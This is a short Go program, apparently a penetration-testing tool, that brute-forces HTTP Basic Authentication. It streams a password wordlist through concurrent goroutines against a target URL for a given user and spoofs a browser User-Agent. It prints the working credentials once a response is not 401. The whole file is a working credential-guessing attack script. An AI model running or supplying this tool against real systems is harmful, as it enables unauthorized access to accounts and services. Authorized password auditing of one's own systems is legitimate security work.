/*
	Basic Auth remote bruteforcing
	@sha0coder
*/

package main

import "os"
import "fmt"
import "flag"
import "bufio"
import "net/http"
import "io/ioutil"

func check(err error, msg string) {
	if err != nil {
		fmt.Println(msg)
		os.Exit(1)
	}
}

func urlCheck(url string) bool {
	fmt.Printf("checking %s ... ", url)
	resp, err := http.Get(url)
	check(err, "Can't connect")
	fmt.Printf(" %d\n", resp.StatusCode)
	if resp.StatusCode != 200 {
		return false
	}
	return true
}

func loadWordlist(wordlist string, c chan string) {
	file, err := os.Open(wordlist)
	check(err, "Can't load the wordlist")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		c <- scanner.Text()
	}
	c <- "[EOF1337]"
	close(c)
}

func trypw(url string, user string, password string) (string, int) {
	var resp *http.Response
	var err error
	var html = []byte{}
	var code int = 0
	var client = &http.Client{} // 1 fixed client for goroutine?
	var req *http.Request

	req, err = http.NewRequest("GET", url, nil) // hace la resolucion dns aqui?
	check(err, "Can't connect")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1")
	req.Header.Set("Accept-Encoding", "*")
	req.SetBasicAuth(user, password)
	resp, err = client.Do(req)

	if err == nil && resp != nil {
		code = resp.StatusCode

		if resp.Body != nil {
			html, _ = ioutil.ReadAll(resp.Body)
			resp.Body.Close()
		}
	}

	return string(html), code
}

func main() {
	var url *string = flag.String("url", "", "the url")
	var user *string = flag.String("user", "", "the username")
	var wordlist *string = flag.String("pw", "", "the username")
	var goroutines *int = flag.Int("go", 1, "num of concurrent goroutines")

	var i int
	flag.Parse()

	if *url == "" || *wordlist == "" {
		check(nil, "bad usage --help")
	}

	fmt.Printf("Loading wordlist ...\n")

	c := make(chan string, 6)
	go loadWordlist(*wordlist, c)

	for i = 0; i < *goroutines; i++ {
		go func(r int, c <-chan string) {
			var html string
			var code int

			for w := range c {
				if w == "[EOF1337]" {
					fmt.Println("end.\n")
					os.Exit(1)
				}

				fmt.Printf("\033[2K%s          \r", w)
				html, code = trypw(*url, *user, w)

				if code != 401 {
					fmt.Printf("yeah, code:%d user:%s pwd:%s\n", code, *user, w)
					fmt.Println(html)
					fmt.Printf("---\nyeah, code:%d user:%s pwd:%s\n---\n", code, *user, w)
					os.Exit(1)
				}

			}
		}(i, c)
	}

	fmt.Printf("Scanning, press enter to interrupt.\n")
	fmt.Scanf("%d", &i)
	fmt.Printf("interrupted.")

}
